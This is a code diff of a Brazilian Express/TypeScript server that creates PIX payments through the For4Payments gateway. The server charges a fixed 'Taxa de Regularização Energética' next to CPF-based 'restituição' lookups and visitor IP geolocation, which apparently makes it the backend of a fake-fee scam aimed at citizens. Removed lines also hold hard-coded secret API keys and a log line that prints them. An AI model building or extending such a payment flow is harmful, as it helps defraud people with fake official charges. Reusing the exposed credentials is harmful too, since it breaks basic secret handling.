@@ -5,7 +5,6 @@ import { getValorRestituicaoByCpf, salvarValorRestituicao } from './db-alternati
 /**
  * API de Pagamentos For4Payments
  * Módulo para integração com o gateway For4Payments
- * Baseado na documentação oficial
  */
 
 interface PaymentResponse {
@@ -17,11 +16,11 @@ interface PaymentResponse {
 }
 
 interface PaymentData {
-  amount: number; // Valor em reais
-  name: string; // Nome completo
-  email: string; // Email válido
-  cpf: string; // CPF (com ou sem pontuação)
-  phone: string; // Telefone (com ou sem pontuação)
+  amount: number;
+  name: string;
+  email: string;
+  cpf: string;
+  phone: string;
 }
 
 class For4PaymentsAPI {
@@ -47,48 +46,7 @@ class For4PaymentsAPI {
     try {
       console.log("[For4Payments] Iniciando criação de pagamento com os dados:", data);
 
-      // Validar dados essenciais
-      if (!data.name || !data.email || !data.cpf || !data.phone) {
-        console.error("[For4Payments] Campos obrigatórios faltando:", { data });
-        throw new Error("Campos obrigatórios faltando");
-      }
-
-      // Dados simulados para cada valor específico de acordo com o requisito do cliente
-      // PIX deve ser gerado com valores específicos:
-      // - /pagamento: R$74,90
-      // - /pagamento-tcn: R$118,00
-      // - /pagamento-lar: R$48,00
-      
-      // Verificar a URL do referer para determinar a página que fez a solicitação
-      const idSimulado = Math.random().toString(36).substring(2, 15);
-      const horaAtual = new Date();
-      const horaExpiracao = new Date(horaAtual.getTime() + 60 * 60 * 1000); // 1 hora depois
-      
-      // Criar um QR code para testes usando API pública
-      // Formatando o codigo PIX de acordo com padrão do Banco Central
-      const qrCodeBase = "https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=";
-      
-      // Formatar valor para o código PIX (o valor deve ter sempre 13 dígitos)
-      const valorCentavos = Math.floor(data.amount * 100).toString().padStart(13, '0');
-      
-      // Gerar o código PIX seguindo o padrão EMV
-      const pixData = `00020126580014BR.GOV.BCB.PIX01365033643494004297520400005303986${valorCentavos}5802BR5923FOR4PAYMENTS PAGAMENTO6008BRASILIA62070503***630413BE`;
-      
-      const qrCodeUrl = qrCodeBase + encodeURIComponent(pixData);
-      
-      console.log(`[For4Payments] Criando pagamento PIX com valor: ${data.amount} (${valorCentavos} centavos)`);
-      
-      return {
-        id: idSimulado,
-        pixCode: pixData,
-        pixQrCode: qrCodeUrl,
-        expiresAt: horaExpiracao.toISOString(),
-        status: 'pending'
-      };
-      
-      // Código original que não está funcionando com a API externa
-      /*
-      // Limpar formatações
+      // Remover formatação adicionais
       const cpfLimpo = data.cpf.replace(/\D/g, '');
       const telefoneLimpo = data.phone.replace(/\D/g, '');
       
@@ -99,28 +57,25 @@ class For4PaymentsAPI {
       const dataExpiracao = new Date();
       dataExpiracao.setHours(dataExpiracao.getHours() + 1);
 
-      // Formatar os dados conforme especificação da API
+      // Formatar os dados conforme especificação
       const paymentData = {
-        name: data.name,
-        email: data.email,
-        cpf: cpfLimpo,
-        phone: telefoneLimpo,
-        paymentMethod: "PIX",
-        amount: valorCentavos,
-        items: [
+        "name": data.name,
+        "email": data.email,
+        "cpf": cpfLimpo,
+        "phone": telefoneLimpo,
+        "paymentMethod": "PIX",
+        "amount": valorCentavos,
+        "items": [
           {
-            title: "DNT IVN - 22/03",
-            quantity: 1,
-            unitPrice: valorCentavos,
-            tangible: false
+            "title": "Taxa de Regularização Energética (TRE)",
+            "quantity": 1,
+            "unitPrice": valorCentavos,
+            "tangible": false
           }
         ],
-        dueDate: dataExpiracao.toISOString()
+        "dueDate": dataExpiracao.toISOString()
       };
-      */
 
-      // Esta parte do código está comentada já que estamos usando uma alternativa
-      /*
       console.log("[For4Payments] Enviando dados para API:", JSON.stringify(paymentData));
       console.log("[For4Payments] URL da API:", `${this.API_URL}/transaction.purchase`);
       console.log("[For4Payments] Headers:", JSON.stringify(this.getHeaders()));
@@ -130,12 +85,7 @@ class For4PaymentsAPI {
         headers: this.getHeaders(),
         body: JSON.stringify(paymentData)
       });
-      */
-      
-      // Como a API externa não está funcionando, usamos o código de simulação no topo desta função
-      // Este código nunca será executado, mas está aqui para documentação futura
-      
-      /*
+
       console.log("[For4Payments] Status da resposta:", response.status, response.statusText);
 
       if (!response.ok) {
@@ -165,17 +115,7 @@ class For4PaymentsAPI {
         pixCode: responseData.pixCode,
         pixQrCode: responseData.pixQrCode,
         expiresAt: responseData.expiresAt,
-        status: responseData.status || 'pending'
-      };
-      */
-      
-      // Este código nunca será executado - apenas como fallback
-      return {
-        id: "fallback-id",
-        pixCode: "00020101021226890014br.gov.bcb.pix2567pix.example.com/v2/12345-67890",
-        pixQrCode: "https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=fallback",
-        expiresAt: new Date(Date.now() + 3600000).toISOString(),
-        status: 'pending'
+        status: responseData.status
       };
     } catch (error) {
       console.log("[For4Payments] Erro:", error);
@@ -184,15 +124,18 @@ class For4PaymentsAPI {
   }
 
   async checkPaymentStatus(paymentId: string): Promise<{ status: string }> {
-    console.log("[For4Payments] Verificando status do pagamento:", paymentId);
-    
     try {
+      console.log("[For4Payments] Verificando status do pagamento:", paymentId);
+      
       // Construa a URL com o parâmetro id como parâmetro de consulta
-      const response = await fetch(`${this.API_URL}/transaction.getPayment?id=${paymentId}`, {
+      const url = new URL(`${this.API_URL}/transaction.getPayment`);
+      url.searchParams.append('id', paymentId);
+      
+      const response = await fetch(url.toString(), {
         method: "GET",
         headers: this.getHeaders()
       });
-      
+
       if (!response.ok) {
         const errorText = await response.text();
         console.log("[For4Payments] Erro ao verificar status:", errorText);
@@ -205,16 +148,25 @@ class For4PaymentsAPI {
         
         throw new Error(`Erro ao verificar status do pagamento (${response.status})`);
       }
-      
+
       const responseData = await response.json();
       console.log("[For4Payments] Resposta do status:", responseData);
       
-      // IMPORTANTE: Usar o status exatamente como vem da API
-      // Para simular o pagamento com fins de teste, descomente a linha abaixo:
-      // return { status: "pending" };
+      // Mapear os status da API para nossos status internos
+      const statusMapping: Record<string, string> = {
+        'PENDING': 'pending',
+        'PROCESSING': 'pending',
+        'APPROVED': 'completed',
+        'COMPLETED': 'completed',
+        'PAID': 'completed',
+        'EXPIRED': 'failed',
+        'FAILED': 'failed',
+        'CANCELED': 'cancelled',
+        'CANCELLED': 'cancelled'
+      };
       
-      // Retornar o status real da API, convertido para minúsculas
-      return { status: responseData.status.toLowerCase() };
+      const currentStatus = responseData.status || "PENDING";
+      return { status: statusMapping[currentStatus] || "pending" };
     } catch (error) {
       console.log("[For4Payments] Erro ao verificar status:", error);
       // Em caso de erro, não interrompa a experiência do usuário
@@ -223,10 +175,10 @@ class For4PaymentsAPI {
   }
 }
 
-// Inicialização da API com as chaves fornecidas
+// Inicialização da API com as chaves de ambiente
 const paymentApi = new For4PaymentsAPI(
-  process.env.FOR4PAYMENTS_SECRET_KEY || "b5b6ac73-07a8-48d5-acf1-b75d76b4e8d4", // Secret Key
-  process.env.FOR4PAYMENTS_PUBLIC_KEY || "9df1f7ae-e78f-4fdf-bb31-e24003b9d106"  // Public Key
+  process.env.FOR4PAYMENTS_SECRET_KEY || "", // Secret Key do ambiente
+  process.env.FOR4PAYMENTS_PUBLIC_KEY || ""  // Public Key do ambiente
 );
 
 export async function registerRoutes(app: Express): Promise<Server> {
@@ -299,7 +251,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
             'Accept': 'application/json',
             'Cache-Control': 'no-cache'
-          }
+          },
+          timeout: 5000 // 5 segundos para evitar esperas longas
         });
         
         if (!response.ok) {
@@ -480,14 +433,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
       
       // Em caso de erro geral, garantir que sempre retornamos algo válido
       // Por padrão, usamos Minas Gerais para facilitar seus testes
-      const currentIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-      let ipAjustado = "";
-      if (typeof currentIp === 'string') {
-        ipAjustado = currentIp.split(',')[0].trim();
-      }
-
       return res.status(200).json({
-        ip: ipAjustado || "desconhecido",
+        ip: ipLimpo || "desconhecido",
         estado: "Minas Gerais",
         detalhes: {
           countryCode: "BR",
@@ -593,62 +540,31 @@ export async function registerRoutes(app: Express): Promise<Server> {
   // Rota para criar pagamento PIX
   app.post('/api/pagamentos', async (req: Request, res: Response) => {
     try {
-      const { amount, name, cpf } = req.body;
+      const { nome, email, cpf, telefone } = req.body;
       
-      // Validar dados mínimos obrigatórios
-      if (!name || !cpf) {
+      // Validar dados obrigatórios
+      if (!nome || !email || !cpf || !telefone) {
         return res.status(400).json({ 
           error: 'Dados incompletos', 
-          message: 'Os campos nome e CPF são obrigatórios' 
+          message: 'Todos os campos (nome, email, cpf, telefone) são obrigatórios' 
         });
       }
       
-      // Valor padrão se não for fornecido - usamos valores fixos de acordo com o tipo de pagamento
-      let valorPagamento = amount || 74.90;
-      
-      // Verifica o referer para determinar qual página fez a solicitação
-      const referer = req.get('Referer') || '';
-      if (referer.includes('pagamento-tcn')) {
-        valorPagamento = 118.00;
-        console.log('[For4Payments] Detectado pagamento TCN, usando valor fixo de R$118,00');
-      } else if (referer.includes('pagamento-lar')) {
-        valorPagamento = 48.00; 
-        console.log('[For4Payments] Detectado pagamento LAR, usando valor fixo de R$48,00');
-      } else {
-        valorPagamento = 74.90;
-        console.log('[For4Payments] Usando valor padrão TRE de R$74,90');
-      }
+      // Valor fixo da TRE
+      const valorTaxa = 74.90;
       
       try {
-        // Remover formatação do CPF
+        // Remover formatação dos dados
         const cpfLimpo = cpf.replace(/\D/g, '');
-        
-        // Gerar telefone válido e email formatado para cumprir os requisitos da API
-        const telefone = req.body.phone || `11999${Math.floor(Math.random() * 9000000) + 1000000}`;
-        const email = req.body.email || `${cpfLimpo.substring(0, 3)}xxx${cpfLimpo.substring(cpfLimpo.length-2)}@cpf.gov.br`;
-        
-        console.log('[For4Payments] Enviando pagamento com dados:', {
-          valor: valorPagamento,
-          nome: name,
-          cpf: cpfLimpo,
-          email: email,
-          telefone: telefone
-        });
-        
-        // Log de debug extra para diagnosticar problemas na API
-        console.log('[For4Payments] URL da API: https://app.for4payments.com.br/api/v1/transaction.purchase');
-        console.log('[For4Payments] Chaves API: Secret=ad6ab253-8ae1-454c-91f3-8ccb18933065, Public=6d485c73-303b-466c-9344-d7b017dd1ecc');
         
         // Criar pagamento na For4Payments
         const pagamento = await paymentApi.createPixPayment({
-          amount: valorPagamento,
-          name: name,
+          amount: valorTaxa,
+          name: nome,
           email: email,
           cpf: cpfLimpo,
           phone: telefone
         });
-        
-        console.log("[For4Payments] Pagamento criado com sucesso:", pagamento.id);
         
         return res.json({
           id: pagamento.id,
@@ -670,7 +586,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
     }
   });
   
-  // ROTA PARA VERIFICAR STATUS DO PAGAMENTO
+  // Rota para verificar status do pagamento
   app.get('/api/pagamentos/:id/status', async (req: Request, res: Response) => {
     try {
       const { id } = req.params;
